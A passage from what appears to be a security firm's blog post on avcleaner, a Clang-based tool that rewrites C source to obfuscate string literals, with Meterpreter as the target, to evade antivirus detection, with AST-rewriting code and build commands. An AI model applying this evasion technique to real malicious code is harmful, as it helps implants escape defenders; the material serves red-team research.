    </span></span><span class="com"><span class="com">// handle "TEXT" macro argument, for instance LoadLibrary(TEXT("ntdll"));</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">bool</span></span><span class="pln"><span class="pln"> isMacro </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getSourceMgr</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">isMacroBodyExpansion</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBeginLoc</span></span><span class="pun"><span class="pun">());</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">isMacro</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        </span></span><span class="typ"><span class="typ">StringRef</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">OrigText</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">Lexer</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">getSourceText</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">CharSourceRange</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getSourceRange</span></span><span class="pun"><span class="pun">(),</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">true</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
                                                         pContext</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getSourceManager</span></span><span class="pun"><span class="pun">(),</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getLangOpts</span></span><span class="pun"><span class="pun">());</span></span><span class="pln"><span class="pln">

        </span></span><span class="com"><span class="com">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">OrigText</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">find</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"TEXT"</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">!=</span></span><span class="pln"><span class="pln"> std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">npos</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

            </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="typ"><span class="typ">RemoveText</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
            </span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">setEnd</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getSourceMgr</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">getFileLoc</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getEndLoc</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">getLocWithOffset</span></span><span class="pun"><span class="pun">(-</span></span><span class="lit"><span class="lit">1</span></span><span class="pun"><span class="pun">)));</span></span><span class="pln"><span class="pln">
        </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="typ"><span class="typ">ReplaceText</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Replacement</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<p class="has-text-align-left">Normally, replacing text should be realised with the <em><a href="https://clang.llvm.org/doxygen/classclang_1_1Rewriter.html#afe00ce2338ce67ba76832678f21956ed">ReplaceText</a></em> API, but in practice too many bugs were encountered with it. When it comes to macros, things tend to get very complicated because <em>Clang’s</em> API behaves inconsistently. For instance, if you remove the check <code class="hljs gherkin prettyprinted" style=""><span class="pln">isMacroBodyExpansion</span><span class="pun">()</span></code>, you will end up replacing “<code class="hljs gherkin prettyprinted" style=""><span class="pln">TEXT</span></code>” instead of its argument.</p>



<p>For instance in <code class="hljs gherkin prettyprinted" style=""><span class="typ">LoadLibrary</span><span class="pun">(</span><span class="pln">TEXT</span><span class="pun">(</span><span class="str">"ntdll"</span><span class="pun">))</span></code>, the actual result would be <code class="hljs gherkin prettyprinted" style=""><span class="typ">LoadLibrary</span><span class="pun">(</span><span class="pln">your_variable</span><span class="pun">(</span><span class="str">"ntdll"</span><span class="pun">))</span></code>, which is incorrect.</p>



<p>The reason for this is that <em>TEXT</em> is a macro that, when handled by the <em>Clang’s</em> preprocessor, is replaced with <code class=" prettyprinted" style=""><span class="pln">L</span><span class="str">"ntdll"</span></code>. Our transformation pass happens after the preprocessor has done its job, so querying the start and end locations of the token “<em>ntdll</em>” will yield values that are off by a few characters, and are not useful to us. Unfortunately, querying the actual locations in the original translation unit is a kind of black magic with <em>Clang’s</em> API, and the working solution was found with trial-and-error, sorry.</p>



<h4 class="wp-block-heading">Inserting a variable declaration at the nearest empty location</h4>



<p>Now that we are able to replace string literals with variable identifiers, the goal is to define that variable and assign it with the value of the original string. In short, we want the patched source code to contain <code class="hljs gherkin prettyprinted" style=""><span class="kwd">char</span><span class="pln"> your_variable</span><span class="pun">[]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">"ntdll"</span></code>, without overwriting anything. </p>



<p>There can be two scenarios:</p>



<ul class="wp-block-list">
<li>The string literal is located within a function body.</li>



<li>The string literal is located outside a function body.</li>
</ul>



<p>The latter is the most straightforward, since it is only needed to find the start of the expression where the string literal is used.</p>



<p>For the former, we need to find the enclosing function. Then, <em>Clang</em> exposes an API to query the start location of the function body (after the first bracket). This is an ideal place to insert a variable declaration because the variable will be visible in the entire function, and the tokens that we insert will not overwrite stuff.</p>



<p>In any case, both situations are solved by visiting every parent node until a node of type <em><a href="https://clang.llvm.org/doxygen/classclang_1_1FunctionDecl.html">FunctionDecl</a></em> or <em><a href="https://clang.llvm.org/doxygen/classclang_1_1VarDecl.html">VarDecl</a></em> is found:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">findInjectionSpot</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Context</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_type_traits</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNode</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Parent</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">Literal</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">bool</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">IsGlobal</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">uint64_t</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Iterations</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Iterations</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&gt;</span></span><span class="pln"><span class="pln"> CLIMB_PARENTS_MAX_ITER</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">throw</span></span><span class="pln"><span class="pln"> std</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">runtime_error</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"Reached max iterations when trying to find a function declaration"</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

    </span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNodeList</span></span><span class="pln"><span class="pln"> parents </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Context</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getParents</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Literal</span></span><span class="pun"><span class="pun">);;</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Iterations</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&gt;</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        parents </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Context</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getParents</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Parent</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">for</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="pln"><span class="pln">parent </span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln"> parents</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

        </span></span><span class="typ"><span class="typ">StringRef</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> parent</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getNodeKind</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">asStringRef</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">

        </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">find</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"FunctionDecl"</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">!=</span></span><span class="pln"><span class="pln"> std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">npos</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">FunDecl</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> parent</span></span><span class="pun"><span class="pun">.</span></span><span class="kwd"><span class="kwd">get</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">FunctionDecl</span></span><span class="pun"><span class="pun">&gt;();</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="typ"><span class="typ">Statement</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">FunDecl</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBody</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="typ"><span class="typ">FirstChild</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="typ"><span class="typ">Statement</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">child_begin</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="typ"><span class="typ">FirstChild</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBeginLoc</span></span><span class="pun"><span class="pun">(),</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">FunDecl</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getEndLoc</span></span><span class="pun"><span class="pun">()};</span></span><span class="pln"><span class="pln">

        </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">else</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">find</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"VarDecl"</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">!=</span></span><span class="pln"><span class="pln"> std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">npos</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

            </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">IsGlobal</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
                </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> parent</span></span><span class="pun"><span class="pun">.</span></span><span class="kwd"><span class="kwd">get</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">VarDecl</span></span><span class="pun"><span class="pun">&gt;()-&gt;</span></span><span class="pln"><span class="pln">getSourceRange</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">
            </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">
        </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

        </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> findInjectionSpot</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Context</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> parent</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Literal</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">IsGlobal</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">++</span></span><span class="typ"><span class="typ">Iterations</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<h3 class="wp-block-heading">Test</h3>



<pre class="wp-block-preformatted prettyprinted" style=""><span class="pln">git clone https</span><span class="pun">:</span><span class="com">//github.com/SCRT/avcleaner</span><span class="pln">
mkdir avcleaner</span><span class="pun">/</span><span class="typ">CMakeBuild</span><span class="pln"> </span><span class="pun">&amp;&amp;</span><span class="pln"> cd avcleaner</span><span class="pun">/</span><span class="typ">CMakeBuild</span><span class="pln">
cmake </span><span class="pun">..</span><span class="pln">
make
cd </span><span class="pun">..</span><span class="pln">
bash run_example</span><span class="pun">.</span><span class="pln">sh test</span><span class="pun">/</span><span class="pln">string_simplest</span><span class="pun">.</span><span class="pln">c</span></pre>



<figure class="wp-block-image fbx-instance"><a href="https://blog.scrt.ch/wp-content/uploads/2020/06/Screenshot-2020-06-18-at-17.50.54-1.png" class="fbx-link"><img loading="lazy" decoding="async" width="1024" height="506" src="https://blog.scrt.ch/wp-content/uploads/2020/06/Screenshot-2020-06-18-at-17.50.54-1-1024x506.png" alt="" class="wp-image-2613"></a></figure>



<p>As you can see, this works pretty well. Now, this example was simple enough that it could have been solved with regexes and way fewer lines of codes. However, even though we are delighted to count the king of regexes (<br><a href="https://twitter.com/1mm0rt411">@1mm0rt411</a> himself) among our ranks, it would have been unfair to challenge him with a task as pesky as string obfuscation in Meterpreter. </p>



<h4 class="wp-block-heading">Going further</h4>



<p>For now, strings are not actually encrypted, in spite of the obfuscation pass being named “StringEncryptor”. How much effort is really needed to actually encrypt the strings? Spoiler: a few more hours, but it is a tradition to leave some exercices for the reader 😉</p>



<p>In addition, <a href="https://twitter.com/TheColonial">@TheColonial</a> recently (April 2020) updated Meterpreter so that it can be compiled with more recent versions of Visual Studio. It means that it should be possible to move on from the C89 standard and handle more corner cases, such as obfuscating the first argument to format string functions.</p>



<h2 class="wp-block-heading">To be continued…</h2>



<p>As this post is already kind of lengthy, it was decided to split it into several parts. In fact, obfuscating strings was the easy part implementation-wise, although you need to be extremely familiar with <em>Clang</em>‘s API. Its documentation being the source code, we recommend allocating a week or two to ingest it as a whole 😛 (and then don’t hesitate to reach out to a specialist for mental health recovery).</p>



<p>The next blog post will be about hiding API Imports automatically.</p>



<h2 class="wp-block-heading">References</h2>



<ul class="wp-block-list">
<li>[1] Rice’s theorem: <a href="https://mathworld.wolfram.com/RicesTheorem.html">https://mathworld.wolfram.com/RicesTheorem.html</a>
</li>



<li>[2] Obfuscator-LLVM – Software Protection for the Masses</li>
</ul>



<p class="has-text-align-right" style="font-size:10px"><em>Vladimir Meier</em></p>
	</div>
<!-- .entry-content -->

	
	<!-- .entry-footer -->

</article><!-- #post-## -->

	
		</main><!-- .site-main -->
	</div>
<!-- .content-area -->


	</div>
<!-- .site-content -->
</div>
<!-- .site -->















<div class="fbx-modal fbx-1 fbx-rounded fbx-light fbx-chrome fbx-no-count fbx-no-buttons fbx-desktop fbx-landscape" tabindex="0"><div class="fbx-inner-spacer"></div><div class="fbx-loader"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-spinner fbx-icon-default"><path class="fbx-icon-spinner-default" d="M3 8c0-0.19 0.011-0.378 0.032-0.563l-2.89-0.939c-0.092 0.487-0.141 0.989-0.141 1.502 0 2.3 0.971 4.374 2.526 5.833l1.786-2.458c-0.814-0.889-1.312-2.074-1.312-3.375zM13 8c0 1.301-0.497 2.486-1.312 3.375l1.786 2.458c1.555-1.459 2.526-3.533 2.526-5.833 0-0.513-0.049-1.015-0.141-1.502l-2.89 0.939c0.021 0.185 0.032 0.373 0.032 0.563zM9 3.1c1.436 0.292 2.649 1.199 3.351 2.435l2.89-0.939c-1.144-2.428-3.473-4.188-6.241-4.534v3.038zM3.649 5.535c0.702-1.236 1.914-2.143 3.351-2.435v-3.038c-2.769 0.345-5.097 2.105-6.241 4.534l2.89 0.939zM10.071 12.552c-0.631 0.288-1.332 0.448-2.071 0.448s-1.44-0.16-2.071-0.448l-1.786 2.458c1.144 0.631 2.458 0.99 3.857 0.99s2.713-0.359 3.857-0.99l-1.786-2.458z"></path><path class="fbx-icon-spinner-flat" d="M10.833 10.495q0.271 0 0.469 0.198l1.885 1.885q0.198 0.198 0.198 0.474 0 0.271-0.198 0.469t-0.469 0.198q-0.276 0-0.474-0.198l-1.885-1.885q-0.193-0.193-0.193-0.474 0-0.276 0.195-0.471t0.471-0.195zM5.172 10.495q0.276 0 0.471 0.195t0.195 0.471-0.198 0.474l-1.885 1.885q-0.198 0.198-0.469 0.198-0.276 0-0.471-0.195t-0.195-0.471q0-0.281 0.193-0.474l1.885-1.885q0.198-0.198 0.474-0.198zM1.333 7.667h2.667q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-2.667q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195zM8 11.667q0.276 0 0.471 0.195t0.195 0.471v2.667q0 0.276-0.195 0.471t-0.471 0.195-0.471-0.195-0.195-0.471v-2.667q0-0.276 0.195-0.471t0.471-0.195zM3.286 2.948q0.271 0 0.469 0.198l1.885 1.885q0.198 0.198 0.198 0.469 0 0.276-0.195 0.471t-0.471 0.195q-0.281 0-0.474-0.193l-1.885-1.885q-0.193-0.193-0.193-0.474 0-0.276 0.195-0.471t0.471-0.195zM12 7.667h2.667q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-2.667q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195zM8 1q0.276 0 0.471 0.195t0.195 0.471v2.667q0 0.276-0.195 0.471t-0.471 0.195-0.471-0.195-0.195-0.471v-2.667q0-0.276 0.195-0.471t0.471-0.195zM12.719 2.948q0.271 0 0.469 0.198t0.198 0.469q0 0.276-0.198 0.474l-1.885 1.885q-0.193 0.193-0.469 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.276 0.193-0.469l1.885-1.885q0.198-0.198 0.474-0.198z"></path><path class="fbx-icon-spinner-1" d="M5.569 12q0 0.536-0.379 0.911t-0.906 0.375q-0.536 0-0.911-0.375t-0.375-0.911 0.375-0.911 0.911-0.375q0.527 0 0.906 0.375t0.379 0.911zM9.426 13.714q0 0.473-0.335 0.808t-0.808 0.335-0.808-0.335-0.335-0.808 0.335-0.808 0.808-0.335 0.808 0.335 0.335 0.808zM3.857 8q0 0.589-0.42 1.009t-1.009 0.42-1.009-0.42-0.42-1.009 0.42-1.009 1.009-0.42 1.009 0.42 0.42 1.009zM13.283 12q0 0.411-0.295 0.705t-0.705 0.295-0.705-0.295-0.295-0.705 0.295-0.705 0.705-0.295 0.705 0.295 0.295 0.705zM5.854 4q0 0.652-0.46 1.112t-1.112 0.46-1.112-0.46-0.46-1.112 0.46-1.112 1.112-0.46 1.112 0.46 0.46 1.112zM9.997 2.286q0 0.714-0.5 1.214t-1.214 0.5-1.214-0.5-0.5-1.214 0.5-1.214 1.214-0.5 1.214 0.5 0.5 1.214zM14.844 8q0 0.357-0.25 0.607t-0.607 0.25-0.607-0.25-0.25-0.607 0.25-0.607 0.607-0.25 0.607 0.25 0.25 0.607zM12.997 4q0 0.295-0.21 0.504t-0.504 0.21-0.504-0.21-0.21-0.504 0.21-0.504 0.504-0.21 0.504 0.21 0.21 0.504z"></path><path class="fbx-icon-spinner-2" d="M16 8c-0.020-1.045-0.247-2.086-0.665-3.038-0.417-0.953-1.023-1.817-1.766-2.53s-1.624-1.278-2.578-1.651c-0.953-0.374-1.978-0.552-2.991-0.531-1.013 0.020-2.021 0.24-2.943 0.646-0.923 0.405-1.758 0.992-2.449 1.712s-1.237 1.574-1.597 2.497c-0.361 0.923-0.533 1.914-0.512 2.895 0.020 0.981 0.234 1.955 0.627 2.847 0.392 0.892 0.961 1.7 1.658 2.368s1.523 1.195 2.416 1.543c0.892 0.348 1.851 0.514 2.799 0.493 0.949-0.020 1.89-0.227 2.751-0.608 0.862-0.379 1.642-0.929 2.287-1.604s1.154-1.472 1.488-2.335c0.204-0.523 0.342-1.069 0.415-1.622 0.019 0.001 0.039 0.002 0.059 0.002 0.552 0 1-0.448 1-1 0-0.028-0.001-0.056-0.004-0.083h0.004zM14.411 10.655c-0.367 0.831-0.898 1.584-1.55 2.206s-1.422 1.112-2.254 1.434c-0.832 0.323-1.723 0.476-2.608 0.454-0.884-0.020-1.759-0.215-2.56-0.57-0.801-0.354-1.526-0.867-2.125-1.495s-1.071-1.371-1.38-2.173c-0.31-0.801-0.457-1.66-0.435-2.512s0.208-1.694 0.551-2.464c0.342-0.77 0.836-1.468 1.441-2.044s1.321-1.029 2.092-1.326c0.771-0.298 1.596-0.438 2.416-0.416s1.629 0.202 2.368 0.532c0.74 0.329 1.41 0.805 1.963 1.387s0.988 1.27 1.272 2.011c0.285 0.74 0.418 1.532 0.397 2.32h0.004c-0.002 0.027-0.004 0.055-0.004 0.083 0 0.516 0.39 0.94 0.892 0.994-0.097 0.544-0.258 1.075-0.481 1.578z"></path><path class="fbx-icon-spinner-3" d="M7 4c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM8 13c-0.552 0-1-0.448-1-1s0.448-1 1-1c0.552 0 1 0.448 1 1s-0.448 1-1 1zM8 8c-1.795 0-3.25 1.455-3.25 3.25s1.455 3.25 3.25 3.25c-3.59 0-6.5-2.91-6.5-6.5s2.91-6.5 6.5-6.5c1.795 0 3.25 1.455 3.25 3.25s-1.455 3.25-3.25 3.25z"></path><path class="fbx-icon-spinner-4" d="M6 2c0-1.105 0.895-2 2-2s2 0.895 2 2c0 1.105-0.895 2-2 2s-2-0.895-2-2zM10.243 3.757c0-1.105 0.895-2 2-2s2 0.895 2 2c0 1.105-0.895 2-2 2s-2-0.895-2-2zM13 8c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM11.243 12.243c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM7 14c0 0 0 0 0 0 0-0.552 0.448-1 1-1s1 0.448 1 1c0 0 0 0 0 0 0 0.552-0.448 1-1 1s-1-0.448-1-1zM2.757 12.243c0 0 0 0 0 0 0-0.552 0.448-1 1-1s1 0.448 1 1c0 0 0 0 0 0 0 0.552-0.448 1-1 1s-1-0.448-1-1zM2.257 3.757c0 0 0 0 0 0 0-0.828 0.672-1.5 1.5-1.5s1.5 0.672 1.5 1.5c0 0 0 0 0 0 0 0.828-0.672 1.5-1.5 1.5s-1.5-0.672-1.5-1.5zM0.875 8c0-0.621 0.504-1.125 1.125-1.125s1.125 0.504 1.125 1.125c0 0.621-0.504 1.125-1.125 1.125s-1.125-0.504-1.125-1.125z"></path><path class="fbx-icon-spinner-5" d="M8 0c-4.355 0-7.898 3.481-7.998 7.812 0.092-3.779 2.966-6.812 6.498-6.812 3.59 0 6.5 3.134 6.5 7 0 0.828 0.672 1.5 1.5 1.5s1.5-0.672 1.5-1.5c0-4.418-3.582-8-8-8zM8 16c4.355 0 7.898-3.481 7.998-7.812-0.092 3.779-2.966 6.812-6.498 6.812-3.59 0-6.5-3.134-6.5-7 